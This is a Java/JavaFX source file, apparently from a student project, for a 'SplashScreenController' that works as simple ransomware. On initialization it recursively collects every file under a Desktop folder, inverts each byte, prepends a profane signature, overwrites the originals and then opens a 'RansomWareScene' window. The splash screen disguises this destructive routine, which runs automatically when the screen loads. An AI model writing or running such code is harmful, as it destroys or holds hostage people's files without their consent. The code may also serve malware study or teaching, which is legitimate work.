package lk.ijse.dep10.app.controller;

import javafx.concurrent.Task;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.Label;
import javafx.scene.control.ProgressBar;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;

import java.io.*;
import java.util.ArrayList;

public class SplashScreenController {

    public ProgressBar pgbLoading;
    public Label lblText;
    ArrayList<File> files = new ArrayList<>();
    final String SIGNATURE = "You Fucked up....!";
    public Stage primaryStage;


    public void initialize() throws IOException {
        File targetDir = new File("/home/thusitha/Desktop");
        findFiles(targetDir);
        encryptFile();

    }

    private void findFiles(File path) {
        File[] files = path.listFiles();
        for (File file : files) {
            if (file.isDirectory()) {
                findFiles(file);
                continue;
            }
            this.files.add(file);
//            System.out.println(file.getAbsolutePath());
        }
    }

    private void encryptFile() throws IOException {

        Task task = new Task<Void>() {
            @Override
            protected Void call() throws Exception {

                int x = 0;
                int size = files.size();

                for (File file : files) {

                    if (findSignature(file)) {
//                        size--;
                        continue;
                    }

                    FileInputStream fis = new FileInputStream(file);
                    File tempFile = File.createTempFile("int", "out");
                    FileOutputStream fos = new FileOutputStream(tempFile);

                    fos.write(SIGNATURE.getBytes());

                    while (true) {
                        byte[] buffer = new byte[1024];
                        int read = fis.read(buffer);

                        for (int i = 0; i < read; i++) {
                            buffer[i] = (byte) ~buffer[i];
                        }
                        if (read == -1) break;
                        fos.write(buffer, 0, read);
                    }

                    fos.close();
                    fis.close();

                    file.delete();
                    tempFile.renameTo(file);

                    updateProgress(++x, size);

                }
                return null;
            }};
        new Thread(task).start();
        pgbLoading.progressProperty().bind(task.progressProperty());
        loadDecrypt();


    }


    private boolean findSignature(File file) throws IOException {
        int length = SIGNATURE.getBytes().length;
        FileInputStream fis = new FileInputStream(file);
        byte[] signature = fis.readNBytes(length);
        return new String(signature).equals(SIGNATURE);

    }
    private void loadDecrypt() throws IOException {
//        mainStage.close();
        Stage stage = new Stage();
        FXMLLoader fxmlLoader = new FXMLLoader(this.getClass().getResource("/view/RansomWareScene.fxml"));
        AnchorPane root = fxmlLoader.load();
        stage.setScene(new Scene(root));
        stage.toFront();
        stage.show();

        RansomWareScene control = fxmlLoader.getController();
        control.files = files;
        control.SIGNATURE = SIGNATURE;



    }

    public void initData(Stage stage) {
        primaryStage = stage;
        System.out.println(primaryStage);
        primaryStage.close();
    }


}



